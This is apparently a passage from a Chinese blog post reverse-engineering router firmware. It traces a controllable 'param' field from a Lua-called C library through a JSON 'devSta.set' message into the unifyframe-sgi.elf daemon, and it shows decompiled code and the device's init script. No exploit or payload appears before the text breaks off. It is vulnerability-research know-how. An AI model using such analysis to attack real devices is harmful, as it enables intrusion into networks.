<p>首先先大致分析一下每个参数是什么，ctype&#x3D;2，cmd&#x3D;’set’，module&#x3D;”networkId_merge”，param&#x3D;可控字段，只到back后面都是null</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">  v8 = <span class="built_in">strlen</span>(v4) + <span class="number">8</span>;</span><br><span class="line">  v9 = <span class="built_in">calloc</span>(v8, <span class="number">1</span>);</span><br><span class="line">  v10 = <span class="number">433</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  v11 = v9;</span><br><span class="line">  v12 = v8;</span><br><span class="line">  v13 = <span class="string">&quot;devSta.%s&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_22;</span><br></pre></td></tr></table></figure>

<p>因此v13&#x3D;”devSta.set”，之后goto LABEL_22</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">LABEL_22:</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">snprintf</span>(calloc_ptr, len2, method, v7) &lt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free</span>(calloc_ptr_1);</span><br><span class="line">LABEL_24:</span><br><span class="line">        json_object_put(method_1);</span><br><span class="line">        syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)method snprintf failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      devSta_string = json_object_new_string(calloc_ptr_1);</span><br><span class="line">      <span class="built_in">free</span>(calloc_ptr_1);</span><br><span class="line">      <span class="keyword">if</span> ( !devSta_string )</span><br><span class="line">      &#123;</span><br><span class="line">        json_object_put(method_1);</span><br><span class="line">        syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_method failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      json_object_object_add(method_1, <span class="string">&quot;method&quot;</span>, devSta_string);</span><br></pre></td></tr></table></figure>

<p>method字段赋为’devSta.set’</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">v20 = json_object_new_object();</span><br><span class="line"><span class="keyword">if</span> ( !v20 )</span><br><span class="line">&#123;</span><br><span class="line">  json_object_put(method_1);</span><br><span class="line">  syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_param failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">v21 = json_object_new_string(*(_DWORD *)(a1 + <span class="number">8</span>));</span><br><span class="line"><span class="keyword">if</span> ( !v21 )</span><br><span class="line">&#123;</span><br><span class="line">  json_object_put(v20);</span><br><span class="line">  json_object_put(method_1);</span><br><span class="line">  syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_module failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">json_object_object_add(v20, <span class="string">&quot;module&quot;</span>, v21);</span><br></pre></td></tr></table></figure>

<p>会发现这个将a1当作地址，然后通过这个来赋值，问题就出现了，上网查了一下加上自己的猜测写下以下的理解</p>
<blockquote>
<p>在lua文件中调用一个C库的函数，首先lua它的每一个协程都有自己的栈，称其为软栈，之后举个例子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;lua.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;lauxlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;lualib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 共享库中的函数实现</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">my_function</span><span class="params">(lua_State *L)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取参数</span></span><br><span class="line">    <span class="type">int</span> arg1 = luaL_checkinteger(L, <span class="number">1</span>);</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *arg2 = luaL_checkstring(L, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印参数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;arg1: %d, arg2: %s\n&quot;</span>, arg1, arg2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回结果</span></span><br><span class="line">    lua_pushstring(L, <span class="string">&quot;result from C function&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 返回一个结果</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册函数</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">luaL_Reg</span> <span class="title">mylib</span>[] =</span> &#123;</span><br><span class="line">    &#123;<span class="string">&quot;my_function&quot;</span>, my_function&#125;,</span><br><span class="line">    &#123;<span class="literal">NULL</span>, <span class="literal">NULL</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开库</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">luaopen_mylib</span><span class="params">(lua_State *L)</span> &#123;</span><br><span class="line">    luaL_newlib(L, mylib);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>会发现它传入的参数是一个指针，同时只有一个指针，然后之后会进行注册函数，两个NULL是哨兵，而参数的调用是用了luaL_checkinteger和luaL_checkstring函数，L是一个指向含有所有参数的内容的指针，猜测L是指向软栈，即lua栈上的内容，或者是C会将软栈上的内容copy到C的某块内存里并写下一个指针指向它，只能说形式不一定是正确的，但是效果是一定的</p>
</blockquote>
<p>之后的分析就不会特别难，主要是看清if条件满不满足，大部分都是可以不用分析的</p>
<p>之后便分析出会发送形如<code>&#123;&quot;method&quot;:&quot;devSta.set&quot;, &quot;params&quot;:&#123;&quot;module&quot;:&quot;networkId_merge&quot;, &quot;async&quot;:true, &quot;data&quot;:&quot;xxx&quot;&#125;&#125;</code></p>
<p>补充一下基础的只是 what is socket？</p>
<blockquote>
<p>Socket（套接字）是网络编程中用于描述计算机之间通信的端点。它提供了一种机制，使得应用程序可以通过网络传输数据。Socket 是操作系统提供的一种编程接口，用于网络通信。它可以在同一台计算机上的不同进程之间通信，也可以在不同计算机之间通信。</p>
<h3 id="Socket-的类型"><a href="#Socket-的类型" class="headerlink" title="Socket 的类型"></a>Socket 的类型</h3><ol>
<li><strong>流式套接字（Stream Socket，SOCK_STREAM）</strong>：<ul>
<li>使用 TCP（传输控制协议）进行通信。</li>
<li>提供可靠的、面向连接的字节流服务。</li>
<li>适用于需要保证数据传输顺序和完整性的应用，例如 HTTP、FTP 等。</li>
</ul>
</li>
<li><strong>数据报套接字（Datagram Socket，SOCK_DGRAM）</strong>：<ul>
<li>使用 UDP（用户数据报协议）进行通信。</li>
<li>提供不可靠的、无连接的消息传递服务。</li>
<li>适用于对实时性要求较高、但对数据传输可靠性要求较低的应用，例如 DNS 查询、视频流等。</li>
</ul>
</li>
</ol>
</blockquote>
<p>分析</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uf_socket_msg_write(v41, v40, v46);</span><br></pre></td></tr></table></figure>

<p>这里有一个uf_socket_msg_write，而winmt师傅猜测因为这里有write，v41是socket的标识符，v40又指向的是我们可控字段的指针，因此这里一定在进程有一个uf_socket_msg_read与它互相接收信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405300037164.png" alt="image-20240527202423205"></p>
<p>再通过&#x2F;etc&#x2F;init.d&#x2F;中也有一个unifyframe-sgi.elf的初始化文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh /etc/rc.common</span></span><br><span class="line"></span><br><span class="line">START=19</span><br><span class="line">STOP=99             <span class="comment">#优先级</span></span><br><span class="line"></span><br><span class="line">PROG=/usr/sbin/unifyframe-sgi.elf</span><br><span class="line">PROG_1=/usr/sbin/uf_ubus_call.elf</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$IPKG_INSTROOT</span>/lib/functions/procd.sh&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    USE_PROCD=1</span><br><span class="line">    <span class="function"><span class="title">start_service</span></span>() &#123;</span><br><span class="line">        <span class="built_in">rm</span> -rf /tmp/uniframe_sgi/lib_uf_server.sock*</span><br><span class="line">        <span class="built_in">rm</span> -rf /tmp/uniframe_sgi/lib_uf_client.sock*</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Starting <span class="variable">$PROG</span> ...&quot;</span></span><br><span class="line">        procd_open_instance</span><br><span class="line">        procd_set_param <span class="built_in">command</span> <span class="variable">$PROG</span></span><br><span class="line">        procd_set_param respawn</span><br><span class="line">        procd_close_instance</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Starting <span class="variable">$PROG_1</span> ...&quot;</span></span><br><span class="line">        procd_open_instance</span><br><span class="line">        procd_set_param <span class="built_in">command</span> <span class="variable">$PROG_1</span></span><br><span class="line">        procd_set_param respawn</span><br><span class="line">        procd_close_instance</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">reload_service</span></span>() &#123;</span><br><span class="line">        restart <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    SERVICE_DAEMONIZE=1</span><br><span class="line">    <span class="function"><span class="title">start</span></span>() &#123;</span><br><span class="line">        <span class="built_in">rm</span> -rf /tmp/uniframe_sgi/lib_uf_server.sock*</span><br><span class="line">        <span class="built_in">rm</span> -rf /tmp/uniframe_sgi/lib_uf_client.sock*</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Starting <span class="variable">$PROG</span> ...&quot;</span></span><br><span class="line">        service_start <span class="variable">$PROG</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Starting <span class="variable">$PROG_1</span> ...&quot;</span></span><br><span class="line">        service_start <span class="variable">$PROG_1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">stop</span></span>() &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Stop <span class="variable">$PROG</span> ...&quot;</span></span><br><span class="line">        service_stop <span class="variable">$PROG</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Stop <span class="variable">$PROG_1</span> ...&quot;</span></span><br><span class="line">        service_stop <span class="variable">$PROG_1</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因此就此可以确认unifyframe-sgi.elf文件就是与本文件的write进行交流的文件，因此着重分析一下unifyframe-sgi.elf文件</p>
<p>从main函数分析起</p>
<h3 id="unifyframe-sgi-elf"><a href="#unifyframe-sgi-elf" class="headerlink" title="unifyframe-sgi.elf"></a>unifyframe-sgi.elf</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v9; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> *v10; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// $v0</span></span><br><span class="line">  BOOL v17; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">int</span> *v19; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> *v20; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> client; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> *v27; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *sock; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// $a0</span></span><br><span class="line">  _DWORD *addr; <span class="comment">// $s0</span></span><br><span class="line">  _DWORD *v32; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *method; <span class="comment">// $s6</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">int</span> v37; <span class="comment">// $a0</span></span><br><span class="line">  _DWORD *v38; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v39; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v40; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v41; <span class="comment">// $s6</span></span><br><span class="line">  _DWORD *v42; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v43[<span class="number">28</span>]; <span class="comment">// [sp+30h] [-C0h] BYREF</span></span><br><span class="line">  __int16 v44[<span class="number">2</span>]; <span class="comment">// [sp+A0h] [-50h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v45; <span class="comment">// [sp+A4h] [-4Ch]</span></span><br><span class="line">  <span class="type">int</span> v46; <span class="comment">// [sp+A8h] [-48h]</span></span><br><span class="line">  <span class="type">char</span> v47[<span class="number">4</span>]; <span class="comment">// [sp+C4h] [-2Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v48[<span class="number">8</span>]; <span class="comment">// [sp+C8h] [-28h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *v49; <span class="comment">// [sp+D0h] [-20h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [sp+D4h] [-1Ch]</span></span><br><span class="line">  _DWORD *aa; <span class="comment">// [sp+D8h] [-18h]</span></span><br><span class="line">  <span class="type">int</span> v52; <span class="comment">// [sp+DCh] [-14h]</span></span><br><span class="line">  __int16 *v53; <span class="comment">// [sp+E0h] [-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v54; <span class="comment">// [sp+E4h] [-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v55; <span class="comment">// [sp+E8h] [-8h]</span></span><br><span class="line"></span><br><span class="line">  mkdir(<span class="string">&quot;/tmp/uniframe_sgi&quot;</span>, <span class="number">511</span>, envp);        <span class="comment">// 创建文件夹</span></span><br><span class="line">  v49 = v43;</span><br><span class="line">  <span class="built_in">memset</span>(v43, <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v43, <span class="string">&quot;/tmp/sgi&quot;</span>);</span><br><span class="line">  <span class="built_in">strcat</span>(v43, <span class="string">&quot;.sgi_ufm&quot;</span>);</span><br><span class="line">  v5 = open(v43, <span class="number">770</span>, <span class="number">438</span>);</span><br><span class="line">  dword_435660 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *(_DWORD *)_errno_location();</span><br><span class="line">    v7 = strerror(v6);</span><br><span class="line">    v8 = v6;</span><br><span class="line">    v9 = <span class="string">&quot;Failed to open file %s, errno=%d, %s.&quot;</span>;</span><br><span class="line">LABEL_8:</span><br><span class="line">    <span class="built_in">printf</span>(v9, <span class="string">&quot;.sgi_ufm&quot;</span>, v8, v7);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v44[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  v45 = <span class="number">0</span>;</span><br><span class="line">  v44[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v46 = <span class="number">0</span>;</span><br><span class="line">  v53 = v44;</span><br><span class="line">  <span class="keyword">if</span> ( fcntl(v5, <span class="number">6</span>, v44) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = (<span class="type">int</span> *)_errno_location();</span><br><span class="line">    <span class="keyword">if</span> ( *v10 == <span class="number">13</span> || *v10 == <span class="number">11</span> )</span><br><span class="line">      close(dword_435660);</span><br><span class="line">    v11 = *v10;</span><br><span class="line">    v7 = strerror(v11);</span><br><span class="line">    v8 = v11;</span><br><span class="line">    v9 = <span class="string">&quot;Failed to lock file %s, errno=%d, %s.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  reserve_record();</span><br><span class="line">  reserve_core();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = getopt(argc, argv, &amp;dword_41FF6C);</span><br><span class="line">    <span class="keyword">if</span> ( v13 == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v13 == <span class="number">100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      